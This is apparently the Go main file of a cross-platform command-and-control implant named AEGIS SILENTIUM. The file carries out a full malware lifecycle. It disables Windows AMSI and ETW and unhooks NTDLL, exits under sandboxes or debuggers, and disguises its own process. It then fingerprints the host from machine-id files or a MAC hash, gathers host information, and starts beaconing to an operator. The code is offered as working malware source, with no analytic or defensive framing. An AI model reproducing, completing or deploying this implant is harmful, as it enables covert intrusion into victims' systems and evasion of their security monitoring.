// AEGIS SILENTIUM — Compiled implant agent
// Targets: linux/amd64, linux/arm64, windows/amd64, darwin/amd64
// Languages: Go (core), C/CGO (inject, bypass)
// Build: see implant/build.sh
package main

import (
	"crypto/rand"
	"crypto/sha256"
	"net"
	"encoding/hex"
	"math/big"
	mathrand "math/rand"
	"os"
	"strings"
	"runtime"
	"time"

	"aegis-silentium/implant/beacon"
	"aegis-silentium/implant/bypass"
	"aegis-silentium/implant/config"
	"aegis-silentium/implant/evasion"
	"aegis-silentium/implant/recon"
)

func main() {
	// ── Phase 0: Windows hardening (AMSI, ETW, NTDLL unhook) ─────────────────
	if runtime.GOOS == "windows" {
		bypass.Harden()
	}

	// ── Phase 1: Anti-analysis ────────────────────────────────────────────────
	if evasion.IsSandbox() {
		time.Sleep(randDuration(90, 180))
		os.Exit(0)
	}
	if evasion.IsBeingDebugged() {
		os.Exit(0)
	}

	// ── Phase 2: Process masquerade ───────────────────────────────────────────
	evasion.MasqueradeProcess()

	// ── Phase 3: Startup jitter ───────────────────────────────────────────────
	time.Sleep(randDuration(5, 45))

	// ── Phase 4: Build stable host identity ───────────────────────────────────
	hostID := stableHostID()

	// ── Phase 5: Load configuration ───────────────────────────────────────────
	cfg := config.Load()
	cfg.HostID = hostID
	cfg.OS     = runtime.GOOS
	cfg.Arch   = runtime.GOARCH

	// ── Phase 6: Host reconnaissance ──────────────────────────────────────────
	hostInfo := recon.Collect()

	// ── Phase 7: Beacon loop ──────────────────────────────────────────────────
	agent := beacon.NewAgent(cfg, hostInfo)
	agent.Run()
}

// stableHostID derives a stable, persistent identifier from machine properties.
// Priority: (1) /etc/machine-id  (2) hostname+MAC hash  (3) stored .hostid file
// Falls back to a random ID only as last resort, with a warning.
func stableHostID() string {
	// 1. Try /etc/machine-id (Linux standard)
	if data, err := os.ReadFile("/etc/machine-id"); err == nil {
		id := strings.TrimSpace(string(data))
		if len(id) >= 16 {
			return id[:16]
		}
	}
	// 2. Try /var/lib/dbus/machine-id (fallback path)
	if data, err := os.ReadFile("/var/lib/dbus/machine-id"); err == nil {
		id := strings.TrimSpace(string(data))
		if len(id) >= 16 {
			return id[:16]
		}
	}
	// 3. Derive from hostname + primary MAC address
	hostname, _ := os.Hostname()
	h := sha256.New()
	h.Write([]byte(hostname))
	if ifaces, err := net.Interfaces(); err == nil {
		for _, iface := range ifaces {
			if len(iface.HardwareAddr) > 0 {
				h.Write(iface.HardwareAddr)
				break
			}
		}
	}
	digest := hex.EncodeToString(h.Sum(nil))
	if len(digest) >= 16 {
		return digest[:16]
	}
	// 4. Last resort: random (not persistent across restarts)
	// Log warning to operator if this path is hit
	b := make([]byte, 8)
	_, _ = rand.Read(b)
	return "R" + hex.EncodeToString(b)[:15] // "R" prefix marks non-stable IDs
}

func randDuration(minSec, maxSec int) time.Duration {
	diff := maxSec - minSec
	if diff <= 0 {
		return time.Duration(minSec) * time.Second
	}
	n, err := rand.Int(rand.Reader, big.NewInt(int64(diff)))
	var sec int
	if err != nil {
		sec = minSec + mathrand.Intn(diff)
	} else {
		sec = minSec + int(n.Int64())
	}
	return time.Duration(sec) * time.Second
}
